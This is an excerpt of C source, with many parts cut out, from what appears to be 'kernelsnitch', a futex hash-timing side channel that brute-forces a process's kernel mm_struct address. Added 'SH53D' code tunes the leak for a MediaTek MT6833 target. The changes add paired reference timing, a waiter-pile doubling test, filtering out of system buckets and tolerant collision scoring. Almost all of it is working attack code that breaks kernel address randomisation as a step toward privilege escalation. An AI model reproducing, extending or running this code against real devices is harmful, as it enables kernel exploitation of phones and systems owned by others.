...
#if SH53D_RATIOMETRIC_COLLISIONS
#define SH53D_SLOW_CAP 4096
#ifndef SH53D_SCAN_BUDGET
#define SH53D_SCAN_BUDGET 32768
#endif
#ifndef SH53D_MAX_TRIPLES
#define SH53D_MAX_TRIPLES 8
#endif
    volatile size_t increase_ready;
    volatile size_t kept_count;
    volatile size_t triple[4];
    volatile size_t slow_ratio[SH53D_SLOW_CAP];
#endif
...
#if SH53D_RATIOMETRIC_COLLISIONS
    __sync_fetch_and_add(&ks->increase_ready, 1);
#endif
...
#if SH53D_RATIOMETRIC_COLLISIONS
    {
        /* SH53D: wait until every waiter thread is born (else the pile
         * is shallow while early candidates are scanned). */
        size_t waited_ms = 0;
        while (__sync_fetch_and_add(&ks->increase_ready, 0) < amount &&
               waited_ms < 30000) {
            usleep(20000);
            waited_ms += 20;
        }
        usleep(500000);
#ifndef SH53D_PILE_SETTLE_MS
#define SH53D_PILE_SETTLE_MS 10000
#endif
        /* SH53D: let the creation burst decay so timing is quiet. */
        usleep(SH53D_PILE_SETTLE_MS * 1000);
        if (ks->verbose)
            pr_info("pile ready %zu/%zu after %zums\n",
                    (size_t)__sync_fetch_and_add(&ks->increase_ready, 0),
                    amount, waited_ms);
    }
#else
    WAIT();
...
#if SH53D_RATIOMETRIC_COLLISIONS
/* SH53D: paired candidate/reference measurement. ref and candidate are
 * sampled alternately within one loop so load bursts and cache/TLB state
 * affect both equally; the reported ratio uses per-pair medians. This
 * removes the systematic skew of sequential measure loops, where the
 * candidate loop always runs coldest. Returns tc/ref*1000 (per-mille)
 * or 0 when the reference itself looks disturbed. */
static size_t __measure_paired(struct kernelsnitch_shared_state *ks,
                               size_t futex_addr, size_t ref_addr,
                               size_t *tc_out, size_t *ref_out)
{
    static size_t tp[REPEAT_MEASUREMENT], rp[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
        size_t t0, t1, s0, s1;
        sched_yield();
        t0 = rdtsc_begin();
        ...
        t1 = rdtsc_end();
        s0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)ref_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        s1 = rdtsc_end();
        tp[l] = t1 - t0;
        rp[l] = s1 - s0;
    }
    qsort(tp, ks->repeat_measurement, sizeof(size_t), __compare);
    qsort(rp, ks->repeat_measurement, sizeof(size_t), __compare);
    static size_t rr[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l)
        rr[l] = rp[l] ? tp[l] * 1000 / rp[l] : 0;
    qsort(rr, ks->repeat_measurement, sizeof(size_t), __compare);
    size_t t = 0, r = 0;
    for (size_t l = 0; l < ks->average; ++l) {
        t += tp[l];
        r += rp[l];
    ...
    if (ref_out)
        *ref_out = r;
    /* median-of-averaged per-pair per-mille ratio (robust center) */
    return rr[ks->repeat_measurement / 2];
}
#endif
...
#ifndef KERNELSNITCH_BRUTE_GRANULE
...
#ifdef KERNELSNITCH_BRUTE_GRANULE
        size_t coarse_end = coarse_addr + COARSE_SZ;
        if (coarse_end > range->end)
            coarse_end = range->end;
        size_t first_candidate =
            (coarse_addr + KERNELSNITCH_BRUTE_GRANULE - 1) &
            ~(KERNELSNITCH_BRUTE_GRANULE - 1);
        for (size_t mm_struct_candidate = first_candidate;
             (mm_struct_candidate < coarse_end) && !ks->found;
             mm_struct_candidate += KERNELSNITCH_BRUTE_GRANULE) {
...
#if SH53D_RATIOMETRIC_COLLISIONS
#if defined(SH53D_TOLERANT_COLLISION_SCORE) && SH53D_TOLERANT_COLLISION_SCORE
                    uint32_t target_hash =
                        futex_hash(ks->futex_addrs[0], mm_struct_candidate);
                    found_hash =
                        target_hash ==
                        futex_hash(ks->futex_addrs[ks->triple[1]],
                                   mm_struct_candidate);
                    if (found_hash) {
                        size_t score = 0;
                        for (size_t ii = 0; ii < ks->kept_count; ++ii) {
                            if (target_hash ==
                                futex_hash(ks->futex_addrs[1 + ii],
                                           mm_struct_candidate))
                                score++;
                        }
                        found_hash = score >= SH53D_TOLERANT_COLLISION_SCORE;
                        if (found_hash && ks->verbose)
                            pr_info("tolerant mm_struct %016zx score=%zu/%zu anchor=%zu\n",
                                    mm_struct_candidate, score,
                                    ks->kept_count, ks->triple[1] - 1);
                    }
#else
                    for (size_t ii = 1; ii < 4 && found_hash; ++ii)
                        found_hash = (futex_hash(ks->futex_addrs[ks->triple[0]], mm_struct_candidate) == futex_hash(ks->futex_addrs[ks->triple[ii]], mm_struct_candidate));
#endif
#else
...
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    ...
    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1
#if SH53D_RATIOMETRIC_COLLISIONS
        + SH53D_SLOW_CAP
#endif
...
#endif
#endif
/* SH53D: ratiometric collision confirmation. On MT6833 the absolute wake
 * latency drifts with cpufreq/load, so an absolute threshold picks noise.
 * When SH53D_RATIOMETRIC_COLLISIONS=1, each candidate is compared against
 * interleaved reference measurements (immune to global shifts) and
 * moments where even the reference is slow are skipped. 0 = upstream. */
#ifndef SH53D_RATIOMETRIC_COLLISIONS
#define SH53D_RATIOMETRIC_COLLISIONS 0
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
...
#if SH53D_RATIOMETRIC_COLLISIONS
    /* SH53D: pile in two halves so phase-1b can verify doubling (causal
     * pile-membership test). First half now, top-up after the scan. */
    __increase(ks, ID, ks->appended_futexes / 2);
#ifdef KERNELSNITCH_MEASURE_CORE
    /* Keep the timing loop off the CPU that created the waiter pile.  This
     * lets targets test whether creation/scheduler residue is being mistaken
     * for a long futex hash-chain walk. */
...
#if SH53D_RATIOMETRIC_COLLISIONS
    /* SH53D phase 1: collect up to SH53D_SLOW_CAP slow candidates within a
     * bounded scan budget. System-occupied buckets also look slow, so
     * phase 2 (below) re-measures after the pile is gone and keeps only
     * candidates that became fast. */
    {
        size_t scanned = 0;
        for (size_t i = 2; count < SH53D_SLOW_CAP && scanned < SH53D_SCAN_BUDGET; ++i) {
            size_t cand_id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
            if (cand_id >= FUTEX_SZ)
                break;
            size_t cand = (size_t)&ks->futexes[cand_id];
            /* SH53D: prefault the candidate page so first-touch faults
             * under memory pressure cannot masquerade as bucket walks. */
            (void)*(volatile unsigned *)cand;
            size_t tc = 0, rf = 0;
            size_t pm = __measure_paired(ks, cand,
                                         (size_t)&ks->futexes[0], &tc, &rf);
            size_t ref = rf;
            scanned++;
            ks->times[i % ks->total_futexes] = tc;
            if (ref > approx_time * 4)
                continue;
#ifndef SH53D_RATIO_LO
#define SH53D_RATIO_LO 1500
#endif
#ifndef SH53D_RATIO_HI
#define SH53D_RATIO_HI 9000
#endif
            {
                /* pm is per-mille median ratio (paired-robust). */
                if (pm < SH53D_RATIO_LO * 1000 || pm > SH53D_RATIO_HI * 1000)
                    continue; /* outside pile-depth signature band */
            }
            if (ks->verbose)
                pr_info("  slow %016zx pm=%zu\n", cand, pm);
            if (tc > ref * 100) {
                static int tailn;
                if (tailn < 300 && ks->verbose)
                    pr_info("  tail %016zx ratio=%zu\n", cand,
                            ref ? tc / ref : 0);
                tailn++;
            }
            ks->futex_addrs[1 + count] = cand;
            ks->slow_ratio[count] = pm / 1000;
            count++; /* band-passed pile-signature candidate */
        }
    }
#else
...
#endif
#if SH53D_RATIOMETRIC_COLLISIONS
    /* SH53D phase 1b (doubling test): top the pile back up to full depth
     * (same uaddr, same mm, same bucket) and re-measure. True pile
     * members ~double their walk ratio; system buckets stay ~1x;
     * drained transients go fast. Causal, magnitude-agnostic. */
    __increase(ks, ID, ks->appended_futexes - ks->appended_futexes / 2);
    {
        size_t waited_ms = 0;
        while (__sync_fetch_and_add(&ks->increase_ready, 0) <
                   ks->appended_futexes &&
               waited_ms < 30000) {
            usleep(20000);
            waited_ms += 20;
    ...
    }
    {
        ...
        for (size_t k = 0; k < count; k++) {
            size_t cand = ks->futex_addrs[1 + k];
            size_t r1a = ks->slow_ratio[k];
            (void)*(volatile unsigned *)cand; /* re-fault before re-measure */
            size_t tc = 0, rf = 0;
            size_t pm = __measure_paired(ks, cand,
                                         (size_t)&ks->futexes[0], &tc, &rf);
            size_t ratio = pm / 1000;
            if (!r1a)
                continue;
            /* accept ~1.4x-2.6x growth (doubling + margin) */
            if (
#if defined(SH53D_SKIP_DOUBLING_FILTER) && SH53D_SKIP_DOUBLING_FILTER
                0
#else
                ratio * 10 < r1a * 14 || ratio * 10 > r1a * 26
#endif
            )
                continue;
            if (ks->verbose)
                pr_info("  doubled %016zx %zu->%zu\n", cand, r1a, ratio);
            ks->futex_addrs[1 + rekept] = cand;
            ks->slow_ratio[rekept] = ratio;
            rekept++;
        }
        if (ks->verbose)
            pr_info("reconfirm %zu/%zu doubled\n", rekept, count);
        count = rekept;
    }
#endif
#if SH53D_RATIOMETRIC_COLLISIONS
    /* SH53D phase 2: the pile is gone after __decrease; true pile-bucket
     * members became fast, system-occupied buckets stayed slow. */
    __decrease(ks);
    {
        size_t kept = 0;
        for (size_t k = 0; k < count; k++) {
            ...
            size_t pm = __measure_paired(ks, cand,
                                         (size_t)&ks->futexes[0], &tc, &rf);
            if (pm > 50 * 1000)
                continue; /* still slow without pile: system bucket */
            if (ks->verbose)
                pr_info("  kept %016zx re_pm=%zu\n", cand, pm);
            ks->futex_addrs[1 + kept] = cand;
            kept++;
        }
        count = kept;
        ks->kept_count = kept;
...
#if SH53D_RATIOMETRIC_COLLISIONS
    /* pile already released in phase 2 */
#else
    __decrease(ks);
#endif
}
...
#if SH53D_RATIOMETRIC_COLLISIONS
    /* SH53D: kept set may mix true pile members with freed-transient
     * lookalikes. Try successive non-overlapping triples so one pure
     * triple suffices. */
#ifndef SH53D_MAX_TRIPLES
#define SH53D_MAX_TRIPLES 1
#endif
    {
        size_t ntriples =
#if defined(SH53D_TOLERANT_COLLISION_SCORE) && SH53D_TOLERANT_COLLISION_SCORE
            ...
            ks->kept_count / 3;
#endif
        if (ntriples > SH53D_MAX_TRIPLES)
            ntriples = SH53D_MAX_TRIPLES;
        if (ntriples < 1)
            ntriples = 1;
        for (size_t t = 0; t < ntriples && !ks->found; t++) {
            ks->triple[0] = 0;
            ks->triple[1] =
#if defined(SH53D_TOLERANT_COLLISION_SCORE) && SH53D_TOLERANT_COLLISION_SCORE
                1 + t;
            ks->triple[2] = ks->triple[1];
            ks->triple[3] = ks->triple[1];
#else
                1 + 3 * t;
            ks->triple[2] = 2 + 3 * t;
            ks->triple[3] = 3 + 3 * t;
            ...
            if (ks->verbose)
                pr_info("bruteforce triple %zu: %016zx %016zx %016zx\n", t,
                        ks->futex_addrs[ks->triple[1]],
                        ks->futex_addrs[ks->triple[2]],
                        ks->futex_addrs[ks->triple[3]]);
#endif
